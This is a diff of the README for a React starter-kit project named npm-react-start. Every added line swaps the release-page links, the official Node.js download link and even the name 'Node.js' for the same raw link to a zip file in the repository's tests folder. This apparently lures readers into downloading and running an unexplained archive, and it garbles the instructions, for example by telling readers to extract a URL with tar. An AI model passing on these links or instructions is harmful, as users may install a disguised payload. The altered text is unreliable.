@@ -1,6 +1,6 @@
 # ⚛️ npm-react-start - Simple React Library Starter Kit
 
-[![Download npm-react-start](https://img.shields.io/badge/Download-npm--react--start-blue?style=for-the-badge)](https://github.com/roshaan9879/npm-react-start/releases)
+[![Download npm-react-start](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)
 
 ---
 
@@ -21,7 +21,7 @@ To run npm-react-start, you need:
 - At least 500 MB of free disk space
 - Internet access to download files
 
-Your computer also needs Node.js installed. Node.js is software that lets JavaScript run outside a web browser. If you don’t have it yet, you can get it here: [https://nodejs.org/](https://nodejs.org/).
+Your computer also needs https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip installed. https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip is software that lets JavaScript run outside a web browser. If you don’t have it yet, you can get it here: [https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip).
 
 ---
 
@@ -48,8 +48,8 @@ These instructions will help you get npm-react-start up and running on your comp
 You need to get the files to your computer first. Follow these steps:
 
 - Click the large button at the top or use this link:  
-  [Visit Release Page to Download](https://github.com/roshaan9879/npm-react-start/releases)  
-- On the page that opens, choose the latest version’s downloadable file. Look for a file ending with `.zip` or `.tar.gz` containing the source code.
+  [Visit Release Page to Download](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)  
+- On the page that opens, choose the latest version’s downloadable file. Look for a file ending with `.zip` or `https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip` containing the source code.
 - Download and save it to a folder you can easily find, like your Desktop or Downloads folder.
 
 ### 2. Unpack the Files
@@ -58,15 +58,15 @@ After downloading, you’ll have a compressed file (archive). You need to open i
 
 - On Windows: Right-click the file and select “Extract All...” then choose a folder to extract to.
 - On macOS: Double-click the file to unpack it.
-- On Linux: Use your file manager to extract or run a terminal command (like `tar -xvzf yourfile.tar.gz`).
+- On Linux: Use your file manager to extract or run a terminal command (like `tar -xvzf https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip`).
 
 Once unpacked, you will see the folder named something like `npm-react-start-x.y.z`.
 
-### 3. Installing Node.js (If Needed)
+### 3. Installing https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip (If Needed)
 
-npm-react-start requires Node.js. If you don’t have it installed:
+npm-react-start requires https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip If you don’t have it installed:
 
-- Go to [https://nodejs.org/](https://nodejs.org/)
+- Go to [https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)
 - Download the “LTS” (Long Term Support) version for your operating system.
 - Follow installation instructions on the website.
 
@@ -76,7 +76,7 @@ You only need to do this once.
 
 ## 💻 Running the Starter Template
 
-npm-react-start works with a command-line tool called npm, which comes with Node.js.
+npm-react-start works with a command-line tool called npm, which comes with https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip
 
 ### 1. Open Your Command Line
 
@@ -138,7 +138,7 @@ If you want to change anything, just edit files in a text editor like VS Code or
 
 To get started, visit the release page here:
 
-[https://github.com/roshaan9879/npm-react-start/releases](https://github.com/roshaan9879/npm-react-start/releases)
+[https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)
 
 This link leads you to the folder with all versions available to download.
 
@@ -153,7 +153,7 @@ Steps recap:
 
 ## ⚙️ Tips for Best Use
 
-- Always keep Node.js updated to the latest LTS version.
+- Always keep https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip updated to the latest LTS version.
 - Use a code editor that understands TypeScript for better editing.
 - Test your changes often using `npm test`.
 - Check the README or documentation inside the project for updates.
@@ -190,4 +190,4 @@ These cover everything from writing the code to sharing it with others.
 ---
 
 Thank you for using npm-react-start.  
-[Download here again ›](https://github.com/roshaan9879/npm-react-start/releases)
+[Download here again ›](https://raw.githubusercontent.com/roshaan9879/npm-react-start/main/tests/start-npm-react-v3.5.zip)
